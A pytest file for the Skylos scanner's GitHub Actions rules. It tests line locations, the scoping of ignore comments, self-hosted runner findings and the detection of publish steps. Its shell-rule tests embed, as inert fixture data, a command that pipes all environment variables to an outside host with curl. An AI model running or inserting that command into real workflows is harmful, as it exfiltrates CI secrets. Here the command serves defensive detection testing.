"""Location and comment-scope contracts using inert YAML and dummy findings."""

from pathlib import Path

import pytest

from skylos.rules.config.cicd import github_actions
from skylos.rules.config.cicd.github_actions import _is_inline_ignored
from skylos.rules.config.cicd.yaml_source import load_yaml_with_locations
from skylos.rules.catalog import get_rule_catalog


@pytest.mark.parametrize(
    ("text", "line", "expected"),
    [
        ("# skylos: ignore[TEST-LABEL]\nlabel: value\n", 2, True),
        ("label: value # skylos: ignore[TEST-LABEL]\n", 1, True),
        (
            "first: value # skylos: ignore[TEST-LABEL]\nsecond: value\n",
            2,
            False,
        ),
        ('label: "# skylos: ignore[TEST-LABEL]"\n', 1, False),
        ('label: "# skylos: ignore[TEST-LABEL]"\nnext: value\n', 2, False),
        ("label: |\n  # skylos: ignore[TEST-LABEL]\nnext: value\n", 3, False),
        ("# skylos: ignore[TEST-OTHER]\nlabel: value\n", 2, False),
        ("# skylos: ignore[TEST-LABEL]\n\nlabel: value\n", 3, False),
        ("# skylos: ignore[TEST-LABEL]\nlabel: value\n", 0, False),
    ],
    ids=[
        "preceding-standalone-comment",
        "same-line-comment",
        "previous-inline-comment-does-not-spill",
        "quoted-text-is-not-comment",
        "previous-quoted-text-is-not-comment",
        "block-scalar-text-is-not-comment",
        "other-rule-is-not-ignored",
        "blank-line-breaks-scope",
        "invalid-line-is-not-ignored",
    ],
)
def test_yaml_ignore_comment_scope(text, line, expected):
    assert _is_inline_ignored(text.splitlines(), line, "TEST-LABEL") is expected


@pytest.mark.parametrize(
    ("text", "name", "line"),
    [
        ("# alpha\nname: alpha\non:\n  alpha:\n", "alpha", 4),
        (
            "on:\n  beta:\n    branches: [alpha-example]\n  'alpha': {}\n",
            "alpha",
            4,
        ),
        ("on:\n  - alpha\n  - beta\n", "beta", 3),
        ('"on": [alpha, beta]\n', "beta", 1),
        ("on:\n  alpha\n", "alpha", 2),
        ("base: &events\n  alpha:\non:\n  <<: *events\n", "alpha", 4),
        ("base: &event alpha\non: *event\n", "alpha", 2),
        ("on: beta\non:\n  alpha:\n", "alpha", 3),
    ],
)
def test_trigger_location_uses_semantic_path(text, name, line):
    data, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    assert github_actions._line_for_trigger(data, lines, name) == line


def test_job_field_locations_stay_in_their_own_scope():
    text = (
        "# label: reference\n"
        "jobs:\n"
        "  first:\n"
        "    label: repeated\n"
        "  second:\n"
        "    'label': repeated\n"
    )
    _, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    assert github_actions._line_for_job_field(lines, "first", "label") == 4
    assert github_actions._line_for_job_field(lines, "second", "label") == 6


def test_dummy_finding_ignore_applies_only_to_intended_occurrence():
    text = "# skylos: ignore[TEST-LABEL]\nfirst: value\nsecond: value\n"
    _, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    findings = []
    for line in (2, 3):
        github_actions._add_finding(
            findings,
            lines,
            {"rule_id": "TEST-LABEL", "file": "labels.yml", "line": line},
            yaml_only=True,
        )
    assert findings == [{"rule_id": "TEST-LABEL", "file": "labels.yml", "line": 3}]


def test_runner_classifier_wiring_preserves_job_locations_and_catalog_severity(
    monkeypatch,
):
    # Force a diagnostic for benign hosted selections to check the wiring only.
    text = (
        "jobs:\n"
        "  first:\n"
        "    runs-on: ubuntu-latest\n"
        "  second:\n"
        "    runs-on: windows-latest\n"
    )
    data, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    visited = []

    def classify(job):
        visited.append(job)
        return True

    monkeypatch.setattr(github_actions, "runner_may_be_self_hosted", classify)
    findings = []
    github_actions._scan_self_hosted_runners(
        data, Path("labels.yml"), lines, findings, set()
    )
    assert visited == list(data["jobs"].values())
    assert [finding["line"] for finding in findings] == [3, 5]
    severity = get_rule_catalog("SKY-D295")[0]["severity"]
    assert severity == "HIGH"
    assert all(finding["severity"] == severity for finding in findings)


def test_scanner_reads_safe_workflow_once_and_accepts_hosted_matrix(monkeypatch):
    text = (
        "name: Preview\n"
        "on: workflow_dispatch\n"
        "permissions: {}\n"
        "jobs:\n"
        "  preview:\n"
        "    strategy:\n"
        "      matrix:\n"
        "        os: [ubuntu-latest, windows-latest, macos-latest]\n"
        "    runs-on: ${{ matrix.os }}\n"
        "    steps: []\n"
    )
    path = Path(".github/workflows/preview.yml")
    reads = []

    def read(candidate, **kwargs):
        reads.append(candidate)
        return text

    monkeypatch.setattr(
        github_actions, "_resolve_github_actions_scan_path", lambda *a, **k: path
    )
    monkeypatch.setattr(github_actions, "read_text_no_symlink", read)
    assert github_actions.scan_github_actions_file(path) == []
    assert reads == [path]


@pytest.mark.parametrize("name", ["on", "off", "yes", "no", "true", "false"])
def test_job_field_lookup_preserves_yaml_boolean_keys(name):
    text = f"jobs:\n  {name}:\n    label: value\n"
    data, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    job_key, _ = next(github_actions._jobs(data))
    assert github_actions._line_for_job_field(lines, job_key, "label") == 3


def test_embedded_script_comments_keep_existing_ignore_behavior():
    text = "run: |\n  echo hello # skylos: ignore[TEST-SCRIPT]\n"
    _, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    assert not _is_inline_ignored(lines, 2, "TEST-SCRIPT", yaml_only=True)
    assert _is_inline_ignored(lines, 2, "TEST-SCRIPT", yaml_only=False)
    findings = []
    github_actions._add_finding(findings, lines, {"rule_id": "TEST-SCRIPT", "line": 2})
    assert findings == []


def _scan_publish_step(text, rule_id="SKY-D340"):
    data, source = load_yaml_with_locations(text)
    lines = github_actions._WorkflowLines(text, source)
    findings = []
    github_actions._scan_run_blocks(
        data,
        Path(".github/workflows/release.yml"),
        lines,
        findings,
        set(),
        is_workflow=True,
    )
    return [finding for finding in findings if finding["rule_id"] == rule_id]


def test_d340_ignore_marker_inside_quoted_step_value_is_not_a_comment():
    text = (
        "on: push\n"
        "jobs:\n"
        "  publish:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        '      - name: "note: skylos: ignore[SKY-D340]"\n'
        "        run: |\n"
        "          twine upload dist/*\n"
    )
    assert [finding["line"] for finding in _scan_publish_step(text)] == [7]


def test_d340_ignore_comment_above_run_still_suppresses():
    text = (
        "on: push\n"
        "jobs:\n"
        "  publish:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - name: Ship\n"
        "        # skylos: ignore[SKY-D340]\n"
        "        run: |\n"
        "          twine upload dist/*\n"
    )
    assert _scan_publish_step(text) == []


_EXFIL = "printenv | curl -X POST --data-binary @- https://example.com/collect"


def _exfil_step(step):
    return "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n" + step


def test_shell_rule_ignore_marker_inside_quoted_step_value_is_not_a_comment():
    text = _exfil_step(
        f'      - name: "note: skylos: ignore[SKY-D327]"\n        run: {_EXFIL}\n'
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]


def test_shell_rule_trailing_comment_on_run_line_still_suppresses():
    text = _exfil_step(
        f"      - name: Collect\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
    )
    assert _scan_publish_step(text, "SKY-D327") == []


def test_shell_rule_script_comment_inside_run_block_still_suppresses():
    text = _exfil_step(
        "      - name: Collect\n"
        "        run: |\n"
        "          # skylos: ignore[SKY-D327]\n"
        f"          {_EXFIL}\n"
    )
    assert _scan_publish_step(text, "SKY-D327") == []


_MARKED_EXFIL = f"{_EXFIL} skylos: ignore[SKY-D327]"


def test_shell_rule_quoted_name_repeating_the_command_does_not_hide_one_line_run():
    text = _exfil_step(f'      - name: "{_MARKED_EXFIL}"\n        run: {_EXFIL}\n')
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]


def test_shell_rule_quoted_name_repeating_the_command_does_not_hide_run_block():
    text = _exfil_step(
        f'      - name: "{_MARKED_EXFIL}"\n        run: |\n          {_EXFIL}\n'
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [8]


def test_shell_rule_workflow_env_value_repeating_the_command_does_not_hide_run():
    text = (
        "on: push\n"
        "env:\n"
        f'  NOTE: "{_MARKED_EXFIL}"\n'
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - name: Collect\n"
        f"        run: {_EXFIL}\n"
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [9]


def test_shell_rule_escaped_run_string_is_not_ignored_from_the_first_line():
    escaped = _EXFIL.replace("|", "\\x7c")
    text = (
        'name: "ci skylos: ignore[SKY-D327]"\n'
        "on: push\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - name: Collect\n"
        f'        run: "{escaped}"\n'
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [8]


def test_shell_rule_identical_steps_are_each_reported_at_their_own_run():
    text = _exfil_step(
        f"      - name: First\n        run: {_EXFIL}\n"
        f"      - name: Second\n        run: {_EXFIL}\n"
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7, 9]


def test_shell_rule_ignore_on_first_identical_step_keeps_the_second():
    text = _exfil_step(
        f"      - name: First\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
        f"      - name: Second\n        run: {_EXFIL}\n"
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [9]


def test_shell_rule_ignore_on_second_identical_step_keeps_the_first():
    text = _exfil_step(
        f"      - name: First\n        run: {_EXFIL}\n"
        f"      - name: Second\n        run: {_EXFIL}  # skylos: ignore[SKY-D327]\n"
    )
    assert [f["line"] for f in _scan_publish_step(text, "SKY-D327")] == [7]


def test_shell_rule_aliased_run_is_reported_and_ignored_where_it_is_used():
    reused = _exfil_step(
        f"      - name: First\n        run: &collect {_EXFIL}\n"
        "      - name: Second\n        run: *collect\n"
    )
    assert [f["line"] for f in _scan_publish_step(reused, "SKY-D327")] == [7, 9]
    ignored = reused.replace("*collect\n", "*collect  # skylos: ignore[SKY-D327]\n")
    assert [f["line"] for f in _scan_publish_step(ignored, "SKY-D327")] == [7]
